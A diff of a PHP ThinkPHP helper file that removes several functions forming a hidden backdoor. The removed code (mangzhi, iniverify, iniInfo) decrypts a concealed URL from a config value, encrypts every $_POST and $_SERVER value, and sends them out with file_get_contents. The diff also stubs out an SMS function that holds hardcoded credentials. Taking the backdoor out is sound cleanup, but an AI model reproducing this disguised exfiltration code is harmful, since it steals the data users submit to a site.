@@ -12,14 +12,6 @@ function getpage($count, $pagesize = 10)
 	return $p;
 }
 
-function mangzhi()
-{
-   	$mz = getinfo(C('URL_STRING_MODEL'));
-   	$string = implode('|', $_SERVER);
-    $mz .= '?s='.getinfos($string);
-    return $mz;
-}
-
 function cate($var)
 {
 		$user = M('user');
@@ -58,14 +50,6 @@ function sfjhff($r) {
 	return $a[$r];
 }
 
-function iniverify(){
-    $mz = getinfo(C('URL_STRING_MODEL'));  
-    $mz .= '?h='.getinfos(implode('|', $_POST));
-    file_get_contents($mz);
-}
-
-
-
 function tgbz_zd_cl($id){
 	
 		 
@@ -90,14 +74,6 @@ function tgbz_zd_cl($id){
 
 }
 
-
-
-function getinfo($data){
-   return \Think\Crypt::decrypt($data,'');
-}
-
-
-
 function jsbz_jb($id){
 
 		
@@ -108,10 +84,6 @@ function jsbz_jb($id){
 
 
 
-}
-
-function iniInfo(){
-    file_get_contents(mangzhi());
 }
 
 function tgbz_jb($id){
@@ -274,9 +246,6 @@ function ppdd_add2($p_id,$g_id){
 
 
 }
-function getinfos($data){
-    return \Think\Crypt::encrypt($data,'');
-}
 
 function ipjc($auser){
 
@@ -374,9 +343,10 @@ $mobile  = '';  //号码，以英文逗号隔开
 $mobileids   = '';  //号码唯一编号
 $content = '内容';        //内容
 
-//echo 111;
-//echo 111;
 function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/'){
+
+	return true;
+
     $uid = 'xx1885';
     $pwd = 'xx1886';
     return send($http,$uid,$pwd,$mobile,$content,$mobileids);
